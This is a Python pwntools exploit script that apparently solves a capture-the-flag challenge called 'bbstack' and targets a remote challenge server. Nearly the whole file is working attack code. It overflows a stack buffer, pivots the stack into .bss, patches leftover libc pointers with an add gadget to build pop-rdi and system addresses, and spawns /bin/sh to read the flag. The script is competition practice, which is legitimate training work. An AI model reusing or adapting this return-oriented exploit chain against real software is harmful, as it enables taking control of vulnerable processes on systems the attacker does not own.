from operator import le
from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./bbstack"
elf = ELF(vuln_path)
libc = elf.libc

io = process([vuln_path]) if not f_remote else remote("pwn-231b60695f.challenge.xctf.org.cn", 9999, ssl=True) 


def ddebug(b=""):
    if not f_gdb:
        return
    gdb.attach(io, gdbscript=b)
    pause()

# u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))


"""
0x000000000040111c : add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x000000000040111d : pop rbp ; ret
0x00000000004010bd : pop rbx ; ret
0x00000000004010b1 : pop rsi ; ret
0x000000000040101a : ret
"""
bss = 0x0404010 + 0x8
leave_ret = 0x40115D
call_main = 0x401068
pop_rsi = 0x00000000004010b1
pop_rbx = 0x00000000004010bd
pop_rbp = 0x000000000040111d
add_rbp_0x3d_ebx = 0x000000000040111c
ret = 0x000000000040101a
read_plt = elf.plt["read"]


new_stack = bss + 0x700
payload = b"a" * 32
payload += p64(new_stack)
payload += p64(pop_rsi) + p64(new_stack+8) + p64(read_plt)
payload += p64(leave_ret)
io.sendline(payload)
payload = p64(call_main)
pause()
io.sendline(payload)

new_stack = bss + 0x800
payload = b"a" * 32
payload += p64(new_stack)
payload += p64(pop_rsi) + p64(new_stack+8) + p64(read_plt)
payload += p64(leave_ret)
pause()
io.sendline(payload)
payload = p64(call_main)
pause()
io.sendline(payload)
#
# new_stack = bss + 0x900
# payload = b"a" * 32
# payload += p64(new_stack)
# payload += p64(pop_rsi) + p64(new_stack+8) + p64(read_plt)
# payload += p64(leave_ret)
# pause()
# io.sendline(payload)
# payload = p64(call_main)
# pause()
# io.sendline(payload)

new_stack = bss + 0x900
payload = b"a" * 32
payload += p64(new_stack) + p64(0x0401142)
io.sendline(payload)


ddebug("b *0x40115d\n b *0x40113A\n b *0x4042a0\n continue")
"""
0x000000000002a6c5 : pop rdi ; ret
pwndbg> find 0x404000, 0x404fff,  0x7fe2439a407d
0x4046c0
0x4047c0
0x4048c0
"""
libc_start_main_125 = 0x7f6457ed707d - 0x7f6457ead000
pop_rdi_add_offset = 0x000000000002a6c5 - libc_start_main_125
log.success("pop_rdi_add_offset:-----> " + hex(pop_rdi_add_offset))
system = libc.symbols["system"]
system_add = system - libc_start_main_125

# libc_start_main--->pop rdi
p1 = 0x4046c0
p2 = 0x4047c0
payload = b"/bin/sh"
payload = payload.ljust(32, b"\x00")
payload += p64(p1 + 0x3d)
payload += p64(pop_rbx) + p64(pop_rdi_add_offset) + p64(add_rbp_0x3d_ebx)

# libc_start_main---> system
payload += p64(pop_rbp) + p64(p2 + 0x3d)
payload += p64(pop_rbx) + p64(system_add) + p64(add_rbp_0x3d_ebx)

# 把binsh放到pop rdi后面
payload += p64(pop_rsi) + p64(p1 + 0x8) + p64(read_plt)

# 改 rbp，调到pop_rdi
payload += p64(pop_rbp) + p64(p1 - 0x8) + p64(leave_ret)

io.send(payload)
pause()

payload = p64(0x4048f8)  # binsh
payload += p64(ret) * 30
io.send(payload)
pause()
io.sendline(b"cat flag*")

io.interactive()
